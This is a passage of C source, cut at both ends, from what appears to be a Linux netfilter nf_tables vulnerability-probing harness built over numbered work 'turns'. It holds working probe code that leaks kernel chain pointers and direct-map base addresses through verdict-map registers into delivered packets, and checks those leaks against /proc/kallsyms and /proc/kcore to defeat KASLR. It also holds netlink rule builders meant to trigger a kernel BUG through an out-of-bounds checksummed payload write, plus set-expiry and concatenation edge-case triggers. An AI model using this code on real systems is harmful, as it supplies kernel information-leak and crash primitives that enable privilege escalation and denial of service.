		printf("%s\n", out);
	}
}

static void run_battery(const char *tag, int prog);

static void run_mismatch(void)
{
	uint32_t saved = g_imm_dreg;

	g_imm_dreg = NFT_REG32_00;
	run_battery("mismatch", 0);
	g_imm_dreg = saved;
}

static void run_verdicts(void)
{
	static const uint32_t vals[] = {
		0x00000000u, 0x00000001u, 0x000000ffu, 0x0000ffffu,
		0x00010000u, 0x00020000u, 0x00030000u, 0x7fff0000u,
		0x80000000u, 0xffff0000u, 0xffffffffu, 0x0000fffeu
	};
	struct scen sc;
	char id[96];
	int i;

	for (i = 0; i < (int)(sizeof(vals) / sizeof(vals[0])); i++) {
		snprintf(id, sizeof(id), "verdict_%08x", vals[i]);
		memset(&sc, 0, sizeof(sc));
		sc.id = id;
		sc.prog = 2;
		sc.mut_rec = -1;
		sc.mut_kind = MUT_NONE;
		sc.verdict = vals[i];
		run_scenario(&sc);
	}
}

static void run_battery(const char *tag, int prog)
{
	static char labels[MAX_RECS][96];
	struct scen sc;
	char id[160];
	int i, m;

	snprintf(id, sizeof(id), "%s.base", tag);
	memset(&sc, 0, sizeof(sc));
	sc.id = id;
	sc.prog = prog;
	sc.mut_rec = -1;
	sc.verdict = NF_ACCEPT;
	run_scenario(&sc);

	/* learn the attribute list from the same build path the child uses */
	build(prog, NF_ACCEPT);
	for (i = 0; i < nrecs; i++)
		snprintf(labels[i], sizeof(labels[i]), "%s", recs[i].label);
	for (i = 0; i < nrecs; i++) {
		for (m = 1; m < MUT__COUNT; m++) {
			snprintf(id, sizeof(id), "%s.%s.%s", tag, labels[i], mut_name(m));
			memset(&sc, 0, sizeof(sc));
			sc.id = id;
			sc.prog = prog;
			sc.mut_rec = i;
			sc.mut_kind = m;
			sc.verdict = NF_ACCEPT;
			run_scenario(&sc);
		}
	}
}

/* ---------- turn 531: the verdict-map door ---------- */

static void vmap_one(const char *id, int prog, uint32_t code, const char *chain,
		     int cmp_on, int cmp_len, int cmp_off, int cmp_op,
		     const unsigned char *lit)
{
	struct scen sc;

	g_vcode = code;
	g_vchain = chain;
	g_cmp_on = cmp_on;
	g_cmp_len = cmp_len;
	g_cmp_off = cmp_off;
	g_cmp_op = cmp_op;
	memset(g_cmp_val, 0, sizeof(g_cmp_val));
	if (lit)
		memcpy(g_cmp_val, lit, (size_t)cmp_len);

	memset(&sc, 0, sizeof(sc));
	sc.id = id;
	sc.prog = prog;
	sc.mut_rec = -1;
	sc.mut_kind = MUT_NONE;
	sc.verdict = NF_ACCEPT;
	run_scenario(&sc);
}

/* The grid is built so that every "DROPPED" has a partner "DELIVERED" that
 * differs in exactly one thing -- the literal the cmp compares against.  That
 * turns the probe from a smoke test into a reading of the register:
 *   cmp 4B @+0 == 0x00000001  -> the verdict code really is in the register
 *   cmp 8B @+8 == 0           -> a NULL chain leaves the pointer half zero
 *   cmp 8B @+8 != 0           -> a jump element leaves a NON-ZERO pointer there.
 */
static void run_vmap(void)
{
	static const unsigned char code_accept[4] = { 0x01, 0x00, 0x00, 0x00 };
	static const unsigned char code_jump[4]   = { 0xfd, 0xff, 0xff, 0xff };
	static const unsigned char zero4[4]       = { 0x00, 0x00, 0x00, 0x00 };
	static const unsigned char zero8[8]       = { 0x00, 0x00, 0x00, 0x00,
						      0x00, 0x00, 0x00, 0x00 };

	/* controls: meaning of DROPPED, and that a verdict map itself is legal */
	vmap_one("vmap.ctl.norule", 4, NF_ACCEPT, NULL, 0, 4, 0, NFT_CMP_EQ, NULL);
	vmap_one("vmap.ctl.dreg_verdict", 5, NF_ACCEPT, NULL, 0, 4, 0, NFT_CMP_EQ, NULL);

	/* the door: verdict map -> DATA register */
	vmap_one("vmap.acc.base", 3, NF_ACCEPT, NULL, 0, 4, 0, NFT_CMP_EQ, NULL);
	vmap_one("vmap.acc.cmp_code_eq1", 3, NF_ACCEPT, NULL, 1, 4, 0, NFT_CMP_EQ,
		 code_accept);
	vmap_one("vmap.acc.cmp_code_eq0", 3, NF_ACCEPT, NULL, 1, 4, 0, NFT_CMP_EQ,
		 zero4);
	vmap_one("vmap.acc.cmp_ptr_eq0", 3, NF_ACCEPT, NULL, 1, 8, 2, NFT_CMP_EQ,
		 zero8);
	vmap_one("vmap.acc.cmp_ptr_neq0", 3, NF_ACCEPT, NULL, 1, 8, 2, NFT_CMP_NEQ,
		 zero8);

	/* the same door, element carrying a chain pointer (NFT_JUMP -> c1) */
	vmap_one("vmap.jump.base", 3, NFT_JUMP, "c1", 0, 4, 0, NFT_CMP_EQ, NULL);
	vmap_one("vmap.jump.cmp_code_eqj", 3, NFT_JUMP, "c1", 1, 4, 0, NFT_CMP_EQ,
		 code_jump);
	vmap_one("vmap.jump.cmp_ptr_neq0", 3, NFT_JUMP, "c1", 1, 8, 2, NFT_CMP_NEQ,
		 zero8);
	vmap_one("vmap.jump.cmp_ptr_eq0", 3, NFT_JUMP, "c1", 1, 8, 2, NFT_CMP_EQ,
		 zero8);
}

/* Targeted attribute mutations: only the three attributes that decide this door,
 * so the distribution stays readable instead of being spread over 25 attributes. */
static void run_vmap_mut(void)
{
	static const char *targets[] = {
		"map.data_type",
		"vrule.lookup.dreg",
		"mapelem.elem0.data.verdict.code"
	};
	struct scen sc;
	char id[192];
	int t, i, m, idx;

	g_vcode = NF_ACCEPT;
	g_vchain = NULL;
	g_cmp_on = 0;
	g_cmp_len = 4;
	g_cmp_off = 0;
	g_cmp_op = NFT_CMP_EQ;
	memset(g_cmp_val, 0, sizeof(g_cmp_val));

	for (t = 0; t < (int)(sizeof(targets) / sizeof(targets[0])); t++) {
		build(3, NF_ACCEPT);
		idx = -1;
		for (i = 0; i < nrecs; i++)
			if (!strcmp(recs[i].label, targets[t]))
				idx = i;
		if (idx < 0) {
			printf("S vmapmut.%s.MISSING_LABEL|setup=BUILD_FAIL|send=-|extack=-\n",
			       targets[t]);
			continue;
		}
		for (m = 1; m < MUT__COUNT; m++) {
			snprintf(id, sizeof(id), "vmapmut.%s.%s", targets[t],
				 mut_name(m));
			memset(&sc, 0, sizeof(sc));
			sc.id = id;
			sc.prog = 3;
			sc.mut_rec = idx;
			sc.mut_kind = m;
			sc.verdict = NF_ACCEPT;
			run_scenario(&sc);
		}
	}
}

/* ---------- turn 532: the exfiltration grid ---------- */

/* Independent path to the same number the leak is supposed to carry: the kernel's
 * own symbol table.  With nokaslr the direct-map base is a constant of the build;
 * with KASLR it is drawn per boot.  Reading it here means the leaked top word can be
 * checked against something that did not travel through the packet at all. */
static uint64_t kallsyms_lookup(const char *name)
{
	FILE *f = fopen("/proc/kallsyms", "r");
	char line[256], sym[128], type;
	unsigned long long addr;
	uint64_t v = 0;

	if (!f)
		return 0;
	while (fgets(line, sizeof(line), f)) {
		if (sscanf(line, "%llx %c %127s", &addr, &type, sym) == 3 &&
		    !strcmp(sym, name)) {
			v = (uint64_t)addr;
			break;
		}
	}
	fclose(f);
	return v;
}

/* Read one 8-byte kernel variable through /proc/kcore -- a completely different
 * interface from packet delivery: an ELF view of kernel memory.  Used only to get
 * the *value* of page_offset_base, so the top word the leak carries can be compared
 * against ground truth rather than against my recollection of the x86 constants. */
static uint64_t kcore_read64(uint64_t vaddr, int *okp)
{
	Elf64_Ehdr eh;
	Elf64_Phdr ph;
	uint64_t val = 0;
	int fd, i;

	*okp = 0;
	fd = open("/proc/kcore", O_RDONLY);
	if (fd < 0)
		return 0;
	if (pread(fd, &eh, sizeof(eh), 0) != (ssize_t)sizeof(eh) ||
	    memcmp(eh.e_ident, ELFMAG, SELFMAG) != 0) {
		close(fd);
		return 0;
	}
	for (i = 0; i < eh.e_phnum; i++) {
		off_t at = (off_t)eh.e_phoff + (off_t)i * eh.e_phentsize;

		if (pread(fd, &ph, sizeof(ph), at) != (ssize_t)sizeof(ph))
			continue;
		if (ph.p_type != PT_LOAD)
			continue;
		if (vaddr >= ph.p_vaddr && vaddr + 8 <= ph.p_vaddr + ph.p_memsz) {
			off_t off = (off_t)ph.p_offset + (off_t)(vaddr - ph.p_vaddr);

			if (pread(fd, &val, 8, off) == 8)
				*okp = 1;
			break;
		}
	}
	close(fd);
	return val;
}

static void exfil_one(const char *id, int prog, uint32_t code, const char *chain,
		      int off)
{
	struct scen sc;

	g_vcode = code;
	g_vchain = chain;
	g_cmp_on = 0;
	g_exfil_off = off;
	g_exfil_mode = 1;

	memset(&sc, 0, sizeof(sc));
	sc.id = id;
	sc.prog = prog;
	sc.mut_rec = -1;
	sc.mut_kind = MUT_NONE;
	sc.verdict = NF_ACCEPT;
	run_scenario(&sc);
}

/* Every leak scenario has a partner that differs in exactly one thing:
 *   ctl.norule     vs any              -> what the field holds with no rule at all
 *   ctl.const      vs ctl.map_verdictreg -> same set expression, lookup into a
 *                                        different register: constant stays constant
 *   acc.ptr_hi     vs jump.ptr_hi      -> equal in every respect except that the
 *                                        element carries a chain pointer or not
 */
static void print_ground_truth(void)
{
	printf("K host|page_offset_base_sym=%016llx|vmalloc_base_sym=%016llx|vmemmap_base_sym=%016llx\n",
	       (unsigned long long)kallsyms_lookup("page_offset_base"),
	       (unsigned long long)kallsyms_lookup("vmalloc_base"),
	       (unsigned long long)kallsyms_lookup("vmemmap_base"));
	{
		static const char *names[3] = { "page_offset_base", "vmalloc_base",
						"vmemmap_base" };
		int i;

		for (i = 0; i < 3; i++) {
			uint64_t sym = kallsyms_lookup(names[i]);
			int ok = 0;
			uint64_t val = sym ? kcore_read64(sym, &ok) : 0;

			if (ok)
				printf("K kcore|%s=%016llx|sym=%016llx\n", names[i],
				       (unsigned long long)val,
				       (unsigned long long)sym);
			else
				printf("K kcore|%s=unavailable|sym=%016llx\n", names[i],
				       (unsigned long long)sym);
		}
	}
	{
		/* independent paths to the same number: the CPU flag that decides whether
		 * the kernel uses the 5-level layout at all, and the kernel's own dump of
		 * the page tables, which prints the direct-map base as an address. */
		FILE *f = fopen("/proc/cpuinfo", "r");
		char line[4096];
		int la57 = 0;

		if (f) {
			while (fgets(line, sizeof(line), f))
				if (!strncmp(line, "flags", 5) && strstr(line, " la57"))
					la57 = 1;
			fclose(f);
		}
		printf("K cpu|la57=%d\n", la57);

		f = fopen("/sys/kernel/debug/kernel_page_tables", "r");
		if (f) {
			int shown = 0;
			while (fgets(line, sizeof(line), f) && shown < 2) {
				if (strstr(line, "Direct Mapping") ||
				    strstr(line, "0xff11")) {
					line[strcspn(line, "\n")] = 0;
					printf("K pagetable|%s\n", line);
					shown++;
				}
			}
			fclose(f);
			if (!shown)
				printf("K pagetable|no-match\n");
		} else {
			printf("K pagetable|unavailable\n");
		}
	}
}

static void run_exfil(void)
{
	print_ground_truth();
	exfil_one("exfil.ctl.norule", 4, NF_ACCEPT, NULL, 0);
	exfil_one("exfil.ctl.const", 8, NF_ACCEPT, NULL, 0);
	exfil_one("exfil.ctl.map_verdictreg", 7, NF_ACCEPT, NULL, 0);
	exfil_one("exfil.acc.code", 6, NF_ACCEPT, NULL, 0);
	exfil_one("exfil.acc.ptr_hi", 6, NF_ACCEPT, NULL, 12);
	exfil_one("exfil.jump.code", 6, NFT_JUMP, "c1", 0);
	exfil_one("exfil.jump.word4", 6, NFT_JUMP, "c1", 4);
	exfil_one("exfil.jump.ptr_lo", 6, NFT_JUMP, "c1", 8);
	exfil_one("exfil.jump.ptr_hi", 6, NFT_JUMP, "c1", 12);
	/* the same two words for a DIFFERENT chain object: if the value tracks the
	 * object and not some constant, the base stays and the offset changes */
	exfil_one("exfil.jump2.ptr_lo", 6, NFT_JUMP, "c2", 8);
	exfil_one("exfil.jump2.ptr_hi", 6, NFT_JUMP, "c2", 12);
}

/* ---------- turn 533: the bandwidth grid ---------- */

static void reg_one(const char *id, int prog, uint32_t code, const char *chain)
{
	struct scen sc;

	g_vcode = code;
	g_vchain = chain;
	g_cmp_on = 0;
	g_reg_mode = 1;

	memset(&sc, 0, sizeof(sc));
	sc.id = id;
	sc.prog = prog;
	sc.mut_rec = -1;
	sc.mut_kind = MUT_NONE;
	sc.verdict = NF_ACCEPT;
	run_scenario(&sc);
}

/* Partners, each differing in exactly one thing:
 *   reg.jump.full vs reg.jump.hdr  -> the 16-byte payload write is the only difference
 *   reg.jump.full vs reg.jump.pay  -> the two header writes are the only difference
 *   reg.jump.full vs reg.jump2.full-> the chain the element carries (c1 vs c2)
 *   reg.ctl.const vs reg.ctl.map_verdictreg -> the destination register of the lookup
 *   reg.ctl.norule vs any          -> whether a rule exists at all
 */
static void run_reg(void)
{
	print_ground_truth();
	reg_one("reg.ctl.norule", 4, NF_ACCEPT, NULL);
	reg_one("reg.ctl.const", R_CONST, NF_ACCEPT, NULL);
	reg_one("reg.ctl.map_verdictreg", R_MAPV, NF_ACCEPT, NULL);
	reg_one("reg.acc.full", R_FULL, NF_ACCEPT, NULL);
	reg_one("reg.jump.full", R_FULL, NFT_JUMP, "c1");
	reg_one("reg.jump2.full", R_FULL, NFT_JUMP, "c2");
	reg_one("reg.jump.hdr", R_HDR, NFT_JUMP, "c1");
	reg_one("reg.jump.pay", R_PAY, NFT_JUMP, "c1");
}

/* =====================================================================
 * TURN 534 -- three doors the 533 battery had no vocabulary for.
 *
 * Turn 533 ended by saying that 233 of the 237 "reachable" commits had never
 * been read, and that the only thing on the table was the battery's own
 * blindness.  Turn 534 turns that into a measurement: the 237 are split by
 * whether their code is even compiled into this kernel (15 of the 34 nft_*.c
 * files are not), and the three commits below are the ones that a battery with
 * payload/lookup/cmp/immediate *could* have seen but no message it sent ever
 * reached.  Each gets a scenario pair: a door and a control that differs by
 * one field, so a flip is attributable to the field and not to the shape.
 *
 *   door 1  0ab3be58b45b  nft_payload_set_eval() -> skb_checksum() without
 *                         checking offset + len against skb->len.  Reached by
 *                         `payload set ... csum type inet` with the field past
 *                         the end of the datagram; 6.6.162 breaks the rule out
 *                         before the call (BUG_ON is what 6.6.13 does).
 *   door 2  5e20b39aa784  catchall insert/delete look at nft_set_elem_active()
 *                         only, lookup and dump also skip expired elements.
 *                         An expired catchall element is invisible to the data
 *                         plane, still blocks re-insertion with -EEXIST and is
 *                         still the entry the delete path retires.
 *   door 3  82e491e08571  concatenated set: sum of round_up(field_len, 4) is
 *                         compared with the key length in 6.6.162, an
 *                         equivalent count of registers before.  klen=10 with
 *                         fields [5,4] passes the old test and fails the new.
 *
 * Every attribute number used below was read from
 * include/uapi/linux/netfilter/nf_tables.h of the tree, not remembered:
 *   NFTA_SET_FLAGS 3, KEY_TYPE 4, KEY_LEN 5, DESC 9, ID 10, TIMEOUT 11
 *   NFTA_SET_DESC_CONCAT 2, NFTA_SET_FIELD_LEN 1
 *   NFTA_SET_ELEM_FLAGS 3, NFTA_SET_ELEM_TIMEOUT 4
 *   NFTA_PAYLOAD_CSUM_TYPE 6, CSUM_OFFSET 7, CSUM_FLAGS 8
 *   NFT_SET_TIMEOUT 0x10, NFT_SET_CONCAT 0x80, NFT_SET_ELEM_CATCHALL 0x2
 *   NFT_PAYLOAD_CSUM_INET 1, NFT_PAYLOAD_NETWORK_HEADER 1
 * Three constants inherited from differ533 were WRONG and unused (the turn-531
 * class: a sleeping wrong constant).  Fixed here, and the fix is checked by
 * the scenarios that now use them:
 *   NFTA_SET_DESC was 8 (= NFTA_SET_POLICY), uapi says 9
 *   NFT_SET_CONSTANT was 0x1 (= NFT_SET_ANONYMOUS), uapi says 0x2
 *   NFT_SET_TIMEOUT_ was 1<<3 (= NFT_SET_MAP), uapi says 0x10
 * ===================================================================== */

#define NFT_MSG_DELSETELEM 14
#define NFTA_PAYLOAD_CSUM_TYPE 6
#define NFTA_PAYLOAD_CSUM_OFFSET 7
#define NFT_PAYLOAD_CSUM_INET 1
#define NFTA_SET_DESC_SIZE 1
#define NFTA_SET_GC_INTERVAL 12
#define NFTA_SET_DESC_CONCAT 2
#define NFTA_SET_FIELD_LEN 1
#define NFT_SET_TIMEOUT 0x10
#define NFT_SET_CONCAT 0x80

static void put_be64(struct nlmsghdr *nlh, uint16_t t, uint64_t v, const char *l)
{
	unsigned char b[8];
	int i;

	for (i = 0; i < 8; i++)
		b[i] = (unsigned char)(v >> (56 - 8 * i));
	attr_put(nlh, t, b, 8, l);
}

/* 16 bytes that are the probe's own source address followed by known filler, so a
 * `payload set` of the first word rewrites saddr to itself (control) instead of
 * invalidating the UDP checksum and making the receiver drop for the wrong reason. */
static const unsigned char g_same[16] = {
	0x0a, 0x00, 0x00, 0x01, 0x0b, 0x0c, 0x0d, 0x0e,
	0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16,
};

/* ---------------- door 1 builders ---------------- */

#define C_DOOR    0   /* csum inet, network header, offset 200, len 16  */
#define C_NOCSUM  1   /* same offset, no checksum type at all          */
#define C_INRANGE 2   /* csum inet, offset 12, len 4, the real saddr    */

static void crash_payload_set(struct nlmsghdr *nlh, uint32_t sreg, uint32_t base,
			      uint32_t off, uint32_t len, int csum_type)
{
	struct nlattr *e, *d;

	e = nest_start(nlh, NFTA_LIST_ELEM, "c.st.elem");
	put_str(nlh, NFTA_EXPR_NAME, "payload", "c.st.name");
	d = nest_start(nlh, NFTA_EXPR_DATA, "c.st.data");
	put_be32(nlh, NFTA_PAYLOAD_SREG, sreg, "c.st.sreg");
	put_be32(nlh, NFTA_PAYLOAD_BASE, base, "c.st.base");
	put_be32(nlh, NFTA_PAYLOAD_OFFSET, off, "c.st.offset");
	put_be32(nlh, NFTA_PAYLOAD_LEN, len, "c.st.len");
	if (csum_type) {
		put_be32(nlh, NFTA_PAYLOAD_CSUM_TYPE, (uint32_t)csum_type,
			 "c.st.csum_type");
		put_be32(nlh, NFTA_PAYLOAD_CSUM_OFFSET, 10, "c.st.csum_offset");
	}
	nest_end(nlh, d);
	nest_end(nlh, e);
}

static struct nlmsghdr *op_newrule_crash(const char *table, const char *chain,
					 int prog)
{
	struct nlmsghdr *nlh;
	struct nlattr *exprs;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_RULE_TABLE, table, "c.rule.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "c.rule.chain");
	exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "c.rule.exprs");

	switch (prog) {
	case C_DOOR:
		exfil_imm_value(nlh, NFT_REG32_00, g_reg_const, 16);
		crash_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_NETWORK_HEADER,
				  200, 16, NFT_PAYLOAD_CSUM_INET);
		break;
	case C_NOCSUM:
		exfil_imm_value(nlh, NFT_REG32_00, g_reg_const, 16);
		crash_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_NETWORK_HEADER,
				  200, 16, 0);
		break;
	case C_INRANGE:
		exfil_imm_value(nlh, NFT_REG32_00, g_same, 16);
		crash_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_NETWORK_HEADER,
				  12, 4, NFT_PAYLOAD_CSUM_INET);
		break;
	default:
		return NULL;
	}
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

/* ---------------- door 2 builders ---------------- */

static struct nlmsghdr *op_newset_tmo(const char *table, const char *set,
				      uint32_t flags, uint64_t def_tmo_ms,
				      uint32_t gc_int_ms)
{
	struct nlmsghdr *nlh;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_SET_TABLE, table, "st.table");
	put_str(nlh, NFTA_SET_NAME, set, "st.name");
	put_be32(nlh, NFTA_SET_KEY_TYPE, NFT_DATA_VALUE, "st.key_type");
	put_be32(nlh, NFTA_SET_KEY_LEN, 4, "st.key_len");
	put_be32(nlh, NFTA_SET_ID, 1, "st.id");
	if (flags)
		put_be32(nlh, NFTA_SET_FLAGS, flags, "st.flags");
	if (def_tmo_ms)
		put_be64(nlh, NFTA_SET_TIMEOUT, def_tmo_ms, "st.timeout");
	if (gc_int_ms)
		put_be32(nlh, NFTA_SET_GC_INTERVAL, gc_int_ms, "st.gc_int");
	nops++;
	return nlh;
}

static struct nlmsghdr *op_newsetelem_catchall_tmo(const char *table,
						   const char *set,
						   uint64_t tmo_ms, int excl)
{
	struct nlmsghdr *nlh;
	struct nlattr *elems, *elem;
	uint16_t flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE;

	if (excl)
		flags |= NLM_F_EXCL;
	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM,
			flags, NFPROTO_IPV4);
	put_str(nlh, NFTA_SET_ELEM_LIST_TABLE, table, "se.table");
	put_str(nlh, NFTA_SET_ELEM_LIST_SET, set, "se.set");
	elems = nest_start(nlh, NFTA_SET_ELEM_LIST_ELEMENTS, "se.elements");
	elem = nest_start(nlh, NFTA_LIST_ELEM, "se.elem0");
	put_be32(nlh, NFTA_SET_ELEM_FLAGS, NFT_SET_ELEM_CATCHALL, "se.elem0.flags");
	put_be64(nlh, NFTA_SET_ELEM_TIMEOUT, tmo_ms, "se.elem0.timeout");
	nest_end(nlh, elem);
	nest_end(nlh, elems);
	nops++;
	return nlh;
}

static struct nlmsghdr *op_newsetelem_key_tmo(const char *table, const char *set,
					      uint32_t member_be, uint64_t tmo_ms,
					      int excl)
{
	struct nlmsghdr *nlh;
	struct nlattr *elems, *elem, *key;
	uint16_t flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE;

	if (excl)
		flags |= NLM_F_EXCL;
	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM,
			flags, NFPROTO_IPV4);
	put_str(nlh, NFTA_SET_ELEM_LIST_TABLE, table, "se.table");
	put_str(nlh, NFTA_SET_ELEM_LIST_SET, set, "se.set");
	elems = nest_start(nlh, NFTA_SET_ELEM_LIST_ELEMENTS, "se.elements");
	elem = nest_start(nlh, NFTA_LIST_ELEM, "se.elem0");
	key = nest_start(nlh, NFTA_SET_ELEM_KEY, "se.elem0.key");
	attr_put(nlh, NFTA_DATA_VALUE, &member_be, 4, "se.elem0.key.value");
	nest_end(nlh, key);
	put_be64(nlh, NFTA_SET_ELEM_TIMEOUT, tmo_ms, "se.elem0.timeout");
	nest_end(nlh, elem);
	nest_end(nlh, elems);
	nops++;
	return nlh;
}

static struct nlmsghdr *op_delsetelem_catchall(const char *table, const char *set)
{
	struct nlmsghdr *nlh;
	struct nlattr *elems, *elem;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELSETELEM,
			NLM_F_REQUEST | NLM_F_ACK, NFPROTO_IPV4);
	put_str(nlh, NFTA_SET_ELEM_LIST_TABLE, table, "de.table");
	put_str(nlh, NFTA_SET_ELEM_LIST_SET, set, "de.set");
	elems = nest_start(nlh, NFTA_SET_ELEM_LIST_ELEMENTS, "de.elements");
	elem = nest_start(nlh, NFTA_LIST_ELEM, "de.elem0");
	put_be32(nlh, NFTA_SET_ELEM_FLAGS, NFT_SET_ELEM_CATCHALL, "de.elem0.flags");
	nest_end(nlh, elem);
	nest_end(nlh, elems);
	nops++;
	return nlh;
}

/* ---------------- door 3 builders ---------------- */

static struct nlmsghdr *op_newset_concat(const char *table, const char *set,
					 uint32_t klen, const uint32_t *fields,
					 int nfields)
{
	struct nlmsghdr *nlh;
	struct nlattr *desc, *cat, *le;
	int i;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_SET_TABLE, table, "ct.table");
	put_str(nlh, NFTA_SET_NAME, set, "ct.name");
	put_be32(nlh, NFTA_SET_FLAGS, NFT_SET_CONCAT, "ct.flags");
	put_be32(nlh, NFTA_SET_KEY_TYPE, NFT_DATA_VALUE, "ct.key_type");
	put_be32(nlh, NFTA_SET_KEY_LEN, klen, "ct.key_len");
	put_be32(nlh, NFTA_SET_ID, 1, "ct.id");
	desc = nest_start(nlh, NFTA_SET_DESC, "ct.desc");
	cat = nest_start(nlh, NFTA_SET_DESC_CONCAT, "ct.desc.concat");
	for (i = 0; i < nfields; i++) {
		le = nest_start(nlh, NFTA_LIST_ELEM, "ct.field");
		put_be32(nlh, NFTA_SET_FIELD_LEN, fields[i], "ct.field.len");
		nest_end(nlh, le);
	}
	nest_end(nlh, cat);
	nest_end(nlh, desc);
	nops++;
	return nlh;
}

/* ---------------- turn-534 scenario harness ---------------- */

typedef int (*newfn)(char *out, size_t outsz);

/* assemble whatever has been appended to opbuf[] and push it as one batch;
 * returns 0 on a clean batch, >0 with g_err set on a rejected one, <0 on a
 * local failure */
static int nf_flush(void)
{
	char batch[32768];
	int len, fd, errs;

	len = assemble(batch, sizeof(batch));
	if (len < 0)
		return -1;
	fd = nl_open();
	if (fd < 0)
		return -2;
	errs = send_batch(fd, batch, len);
	close(fd);
	return errs < 0 ? -3 : errs;
}

static const char *deliv(int sr)
{
	if (sr == 0)
		return "DELIVERED";
	if (sr == 1)
		return "DROPPED";
	if (sr > 2000)
		return "SENDERR";
	return "PROBEFAIL";
}

static void run_new(const char *id, newfn fn, int child_timeout)
{
	int pfd[2];
	pid_t pid;
	char out[1024];
	int n = 0, status = 0;

	if (pipe(pfd) < 0)
		return;
	pid = fork();
	if (pid == 0) {
		char buf[768];

		close(pfd[0]);
		dup2(pfd[1], 1);
		close(pfd[1]);
		alarm(child_timeout);
		if (netns_setup() < 0) {
			printf("S %s|setup=NETNS_FAIL\n", id);
			fflush(stdout);
			_exit(0);
		}
		buf[0] = 0;
		fn(buf, sizeof(buf));
		printf("S %s|%s\n", id, buf);
		fflush(stdout);
		_exit(0);
	}
	close(pfd[1]);
	{
		fd_set rfds;
		struct timeval tv;
		int done = 0;

		while (!done) {
			int r;

			FD_ZERO(&rfds);
			FD_SET(pfd[0], &rfds);
			tv.tv_sec = child_timeout + 10;
			tv.tv_usec = 0;
			if (select(pfd[0] + 1, &rfds, NULL, NULL, &tv) <= 0)
				break;
			r = (int)read(pfd[0], out + n, sizeof(out) - 1 - n);
			if (r <= 0)
				done = 1;
			else {
				n += r;
				if (n >= (int)sizeof(out) - 1)
					done = 1;
			}
		}
	}
	close(pfd[0]);
	out[n] = 0;
	waitpid(pid, &status, 0);
	/* a killed child is only half the story: the kernel may have BUG()ed and
	 * taken the whole boot with it, which shows in the serial log, not here */
	if (n == 0) {
		if (WIFSIGNALED(status))
			printf("S %s|setup=CRASH|extack=signal_%d\n", id,
			       WTERMSIG(status));
		else
			printf("S %s|setup=NOREPLY|extack=exit_%d\n", id,
			       WEXITSTATUS(status));
	} else {
		printf("%s", out);
	}
	fflush(stdout);
}

/* ---- door 1 scenarios ---- */
static int sc_crash(int prog, char *out, size_t n)
{
	int errs, sr;

	nops = 0;
	nrecs = 0;
	op_newtable("dt");
	op_newchain("dt", "c", NF_INET_LOCAL_IN, 0, NF_ACCEPT);
	if (op_newrule_crash("dt", "c", prog) == NULL) {
		snprintf(out, n, "setup=BUILD_FAIL");
		return -1;
	}
	errs = nf_flush();
	if (errs < 0) {
		snprintf(out, n, "setup=SENDFAIL_%d", errs);
		return -1;
	}
	if (errs > 0) {
		snprintf(out, n, "setup=ERR|errno=%d|extack=%.80s",
			 g_err ? -g_err : 0, g_extack[0] ? g_extack : "none");
		return 0;
	}
	sr = probe_send();
	snprintf(out, n, "setup=OK|send=%s", deliv(sr));
	return 0;
}

static int sc_crash_door(char *out, size_t n)    { return sc_crash(C_DOOR, out, n); }
static int sc_crash_nocsum(char *out, size_t n)  { return sc_crash(C_NOCSUM, out, n); }
static int sc_crash_inrange(char *out, size_t n) { return sc_crash(C_INRANGE, out, n); }

/* ---- door 2 scenarios ----
 * mode 0 catchall re-insert after expiry      (door)
 * mode 1 catchall delete after expiry         (door)
 * mode 2 catchall re-insert while still live  (control: the EEXIST is real)
 * mode 3 keyed element re-insert after expiry (control: not catchall-specific)
 */
static int sc_cto(int mode, char *out, size_t n)
{
	struct timespec ts;
	const uint64_t tmo = (mode == 2) ? 30000 : 3000;
	int errs, sr1, sr2, sr3, e1;

	nops = 0;
	nrecs = 0;
	op_newtable("dt");
	op_newset_tmo("dt", "s", NFT_SET_TIMEOUT, 30000, 600000);
	op_newchain("dt", "c", NF_INET_LOCAL_IN, 0, NF_ACCEPT);
	op_newrule_lookup("dt", "c", "s", 0, NF_DROP, 1);
	if (mode == 3)
		op_newsetelem_key_tmo("dt", "s", htonl(0x0a000001), tmo, 0);
	else
		op_newsetelem_catchall_tmo("dt", "s", tmo, 0);
	errs = nf_flush();
	if (errs < 0) {
		snprintf(out, n, "setup=SENDFAIL_%d", errs);
		return -1;
	}
	if (errs > 0) {
		snprintf(out, n, "setup=ERR|errno=%d|extack=%.80s",
			 g_err ? -g_err : 0, g_extack[0] ? g_extack : "none");
		return 0;
	}
	sr1 = probe_send();
	ts.tv_sec = (mode == 2) ? 0 : 4;
	ts.tv_nsec = 0;
	nanosleep(&ts, NULL);
	sr2 = probe_send();

	nops = 0;
	nrecs = 0;
	if (mode == 1)
		op_delsetelem_catchall("dt", "s");
	else if (mode == 3)
		op_newsetelem_key_tmo("dt", "s", htonl(0x0a000001), tmo, 1);
	else
		op_newsetelem_catchall_tmo("dt", "s", tmo, 1);
	errs = nf_flush();
	e1 = g_err;
	sr3 = probe_send();
